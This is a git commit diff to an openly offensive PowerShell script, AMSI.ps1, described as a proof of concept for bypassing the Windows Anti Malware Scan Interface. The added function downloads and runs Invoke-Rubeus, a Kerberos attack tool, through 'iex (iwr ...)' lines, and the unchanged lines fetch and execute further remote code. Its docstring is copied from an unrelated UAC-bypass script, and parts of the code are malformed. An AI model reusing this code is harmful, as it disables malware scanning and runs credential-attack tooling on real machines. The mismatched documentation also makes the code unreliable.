1a1d3e0e50befd69f28f041ae2a0e2a30efbe000
Brahim <65988560+x4sh3s@users.noreply.github.com>
2022-12-10 13:20:24 +0100

    Update AMSI.ps1

--- AMSI.ps1
+++ AMSI.ps1
@@ -1,3 +1,25 @@
+<#
+.SYNOPSIS  
+    This script is a proof of concept to bypass Anti Malware Scan Interface By splitting a files into smaller ones
+    
+.NOTES  
+    Function   : AMSI_Bypass
+    File Name  : FodhelperBypass.ps1
+.EXAMPLE  
+     Load "cmd.exe /c powershell.exe" (it's default):
+     FodhelperBypass 
+     Load specific application:
+     FodhelperBypass -program "cmd.exe"
+     FodhelperBypass -program "cmd.exe /c powershell.exe"
+     
+#>
+function AMSI_Lines(){ 
+ Param (
+           
+        [String]$File = "https://raw.githubusercontent.com/S3cur3Th1sSh1t/PowerSharpPack/master/PowerSharpBinaries/Invoke-Rubeus.ps1" #default
+        [String]$Commands = 'invoke-rubeus -command "-h"'
+       )
+       
 $Win32 = @"
 
 using System;
@@ -28,4 +50,7 @@ sleep 2
 iex ( iwr https://raw.githubusercontent.com/x4sh3s/AMSI_Lines/main/11.txt -UseBasicParsing )
 
 sleep 2
-iex ( iwr https://raw.githubusercontent.com/S3cur3Th1sSh1t/PowerSharpPack/master/PowerSharpBinaries/Invoke-Rubeus.ps1 -UseBasicParsing) ; invoke-rubeus -command "-h"
+iex ( iwr $File -UseBasicParsing) ; $Commands
+}
+
+AMSI_Lines()
